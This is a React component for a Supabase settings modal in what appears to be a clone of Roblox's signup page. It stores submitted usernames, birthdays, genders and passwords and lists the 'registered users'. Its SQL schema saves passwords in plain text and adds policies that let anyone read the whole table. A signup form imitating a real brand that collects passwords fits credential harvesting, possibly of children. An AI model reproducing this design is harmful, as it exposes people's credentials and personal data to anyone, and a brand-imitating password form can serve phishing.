import React, { useState, useEffect } from 'react';
import { X, Database, Check, Copy, ExternalLink, RefreshCw, AlertCircle, Key, Server, Users } from 'lucide-react';
import {
  getSupabaseConfig,
  saveSupabaseConfig,
  clearSupabaseConfig,
  getSupabaseClient,
  fetchRegisteredUsers,
} from '../lib/supabase';

const SQL_SCHEMA = `-- Run this in your Supabase Dashboard > SQL Editor:
CREATE TABLE IF NOT EXISTS public.roblox_users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    username TEXT NOT NULL,
    birthday DATE,
    gender TEXT DEFAULT 'unspecified',
    password TEXT,
    created_at TIMESTAMPTZ DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Enable Row Level Security (RLS)
ALTER TABLE public.roblox_users ENABLE ROW LEVEL SECURITY;

-- Allow signups to be saved
CREATE POLICY "Allow public insert" ON public.roblox_users
    FOR INSERT WITH CHECK (true);

-- Allow reading signups
CREATE POLICY "Allow public read" ON public.roblox_users
    FOR SELECT USING (true);
`;

export default function SupabaseModal({ isOpen, onClose }) {
  const [activeTab, setActiveTab] = useState('settings'); // 'settings' | 'users' | 'sql'
  const [url, setUrl] = useState('');
  const [anonKey, setAnonKey] = useState('');
  const [isSaved, setIsSaved] = useState(false);
  const [testStatus, setTestStatus] = useState(null); // null | 'testing' | 'success' | 'error'
  const [testError, setTestError] = useState('');
  const [copiedSql, setCopiedSql] = useState(false);
  const [users, setUsers] = useState([]);
  const [userSource, setUserSource] = useState('local');
  const [isLoadingUsers, setIsLoadingUsers] = useState(false);

  useEffect(() => {
    if (isOpen) {
      const config = getSupabaseConfig();
      setUrl(config.url);
      setAnonKey(config.anonKey);
      loadUsers();
    }
  }, [isOpen]);

  const loadUsers = async () => {
    setIsLoadingUsers(true);
    try {
      const res = await fetchRegisteredUsers();
      setUsers(res.data || []);
      setUserSource(res.source);
    } catch (e) {
      console.error(e);
    } finally {
      setIsLoadingUsers(false);
    }
  };

  const handleSave = () => {
    saveSupabaseConfig(url, anonKey);
    setIsSaved(true);
    setTimeout(() => setIsSaved(false), 2500);
    handleTestConnection();
  };

  const handleClear = () => {
    clearSupabaseConfig();
    setUrl('');
    setAnonKey('');
    setTestStatus(null);
  };

  const handleTestConnection = async () => {
    setTestStatus('testing');
    setTestError('');
    try {
      const client = getSupabaseClient();
      if (!client) {
        setTestStatus('error');
        setTestError('Please provide both Project URL and Anon Key.');
        return;
      }
      const { data, error } = await client.from('roblox_users').select('count', { count: 'exact', head: true });
      if (error) {
        setTestStatus('error');
        setTestError(`Supabase responded: ${error.message}. (Make sure table 'roblox_users' exists in SQL editor)`);
      } else {
        setTestStatus('success');
        loadUsers();
      }
    } catch (e) {
      setTestStatus('error');
      setTestError(e.message || 'Connection failed');
    }
  };

  const handleCopySql = () => {
    navigator.clipboard.writeText(SQL_SCHEMA);
    setCopiedSql(true);
    setTimeout(() => setCopiedSql(false), 2000);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="bg-[#181a1e] border border-zinc-800 rounded-xl w-full max-w-2xl overflow-hidden shadow-2xl flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between bg-[#121316]">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
              <Database className="w-4 h-4 text-emerald-400" />
            </div>
            <div>
              <h2 className="text-white font-bold text-base leading-tight">Supabase Database Integration</h2>
              <p className="text-zinc-400 text-xs">Connect your Supabase project & view live registrations</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-zinc-400 hover:text-white p-1 rounded-md hover:bg-zinc-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-zinc-800 bg-[#141518] px-6 gap-2 text-xs font-semibold">
          <button
            onClick={() => setActiveTab('settings')}
            className={`py-3 px-3 border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'settings'
                ? 'border-emerald-400 text-white'
                : 'border-transparent text-zinc-400 hover:text-zinc-200'
            }`}
          >
            <Server className="w-3.5 h-3.5" />
            Settings & Connection
          </button>
          <button
            onClick={() => {
              setActiveTab('users');
              loadUsers();
            }}
            className={`py-3 px-3 border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'users'
                ? 'border-emerald-400 text-white'
                : 'border-transparent text-zinc-400 hover:text-zinc-200'
            }`}
          >
            <Users className="w-3.5 h-3.5" />
            Registered Users ({users.length})
          </button>
          <button
            onClick={() => setActiveTab('sql')}
            className={`py-3 px-3 border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'sql'
                ? 'border-emerald-400 text-white'
                : 'border-transparent text-zinc-400 hover:text-zinc-200'
            }`}
          >
            <Copy className="w-3.5 h-3.5" />
            SQL Schema
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 overflow-y-auto space-y-5 text-sm">
          {activeTab === 'settings' && (
            <div className="space-y-4">
              <div className="p-3 bg-zinc-900/80 border border-zinc-800 rounded-lg text-xs text-zinc-300 leading-relaxed">
                Connect your free Supabase project to store real-time signups into the <code className="text-emerald-400 font-mono">roblox_users</code> table. If credentials are not yet entered, signups will still work and persist in local storage!
              </div>

              <div>
                <label className="block text-zinc-300 text-xs font-semibold mb-1">
                  Supabase Project URL
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={url}
                    onChange={(e) => setUrl(e.target.value)}
                    placeholder="https://xyzcompany.supabase.co"
                    className="w-full bg-[#101114] border border-zinc-700/80 focus:border-emerald-500 text-white text-xs rounded-md px-3 py-2.5 outline-none transition-colors"
                  />
                </div>
              </div>

              <div>
                <label className="block text-zinc-300 text-xs font-semibold mb-1">
                  Supabase Anon Public Key
                </label>
                <div className="relative">
                  <input
                    type="password"
                    value={anonKey}
                    onChange={(e) => setAnonKey(e.target.value)}
                    placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
                    className="w-full bg-[#101114] border border-zinc-700/80 focus:border-emerald-500 text-white text-xs rounded-md px-3 py-2.5 outline-none font-mono transition-colors"
                  />
                </div>
              </div>

              {/* Status Message */}
              {testStatus === 'success' && (
                <div className="p-3 rounded-lg bg-emerald-950/60 border border-emerald-600/60 text-emerald-200 text-xs flex items-center gap-2">
                  <Check className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span>Successfully connected to Supabase database! Signups are live.</span>
                </div>
              )}

              {testStatus === 'error' && (
                <div className="p-3 rounded-lg bg-red-950/60 border border-red-700/60 text-red-200 text-xs flex items-start gap-2">
                  <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                  <span>{testError}</span>
                </div>
              )}

              {/* Buttons */}
              <div className="flex flex-wrap items-center justify-between gap-3 pt-2">
                <div className="flex items-center gap-2">
                  <button
                    type="button"
                    onClick={handleSave}
                    className="bg-emerald-500 hover:bg-emerald-600 text-black font-bold px-4 py-2 rounded-md text-xs transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    {isSaved ? <Check className="w-3.5 h-3.5" /> : null}
                    Save & Test Connection
                  </button>
                  <button
                    type="button"
                    onClick={handleTestConnection}
                    disabled={testStatus === 'testing'}
                    className="bg-zinc-800 hover:bg-zinc-700 text-zinc-200 px-3 py-2 rounded-md text-xs font-semibold transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${testStatus === 'testing' ? 'animate-spin' : ''}`} />
                    Test Connection
                  </button>
                </div>

                <button
                  type="button"
                  onClick={handleClear}
                  className="text-xs text-zinc-400 hover:text-red-400 transition-colors"
                >
                  Clear Credentials
                </button>
              </div>

              <div className="pt-2 text-xs text-zinc-400">
                <span>Don't have a Supabase account yet? </span>
                <a
                  href="https://supabase.com"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-emerald-400 underline inline-flex items-center gap-1"
                >
                  Create free project at supabase.com <ExternalLink className="w-3 h-3" />
                </a>
              </div>
            </div>
          )}

          {activeTab === 'users' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div className="text-xs text-zinc-400">
                  Data source: <span className="text-white font-medium capitalize">{userSource}</span>
                </div>
                <button
                  onClick={loadUsers}
                  className="text-xs text-zinc-300 hover:text-white flex items-center gap-1.5 bg-zinc-800 px-2.5 py-1 rounded"
                >
                  <RefreshCw className={`w-3 h-3 ${isLoadingUsers ? 'animate-spin' : ''}`} />
                  Refresh
                </button>
              </div>

              {users.length === 0 ? (
                <div className="text-center py-10 text-zinc-400 text-xs">
                  No users registered yet. Try submitting the Roblox signup form!
                </div>
              ) : (
                <div className="border border-zinc-800 rounded-lg overflow-x-auto">
                  <table className="w-full text-left text-xs text-zinc-300">
                    <thead className="bg-[#121316] text-zinc-400 uppercase font-semibold text-[10px] border-b border-zinc-800">
                      <tr>
                        <th className="py-2.5 px-3">Username</th>
                        <th className="py-2.5 px-3">Birthday</th>
                        <th className="py-2.5 px-3">Gender</th>
                        <th className="py-2.5 px-3">Registered At</th>
                        <th className="py-2.5 px-3">Supabase</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-800/60 font-mono text-[11px]">
                      {users.map((u, i) => (
                        <tr key={i} className="hover:bg-zinc-900/50">
                          <td className="py-2 px-3 font-semibold text-white font-sans">{u.username}</td>
                          <td className="py-2 px-3 text-zinc-400">{u.birthday || 'N/A'}</td>
                          <td className="py-2 px-3 capitalize text-zinc-400">{u.gender || 'unspecified'}</td>
                          <td className="py-2 px-3 text-zinc-500">
                            {u.created_at ? new Date(u.created_at).toLocaleTimeString() : 'Recent'}
                          </td>
                          <td className="py-2 px-3">
                            <span className="inline-flex items-center px-1.5 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-300 border border-emerald-800">
                              Synced
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}

          {activeTab === 'sql' && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs text-zinc-300">
                  Run this SQL in your Supabase SQL editor to create the table:
                </span>
                <button
                  onClick={handleCopySql}
                  className="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 text-xs px-2.5 py-1 rounded flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  {copiedSql ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  {copiedSql ? 'Copied!' : 'Copy SQL'}
                </button>
              </div>
              <pre className="bg-[#0e0f12] border border-zinc-800 text-zinc-300 text-xs p-3.5 rounded-lg overflow-x-auto font-mono leading-relaxed">
                {SQL_SCHEMA}
              </pre>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
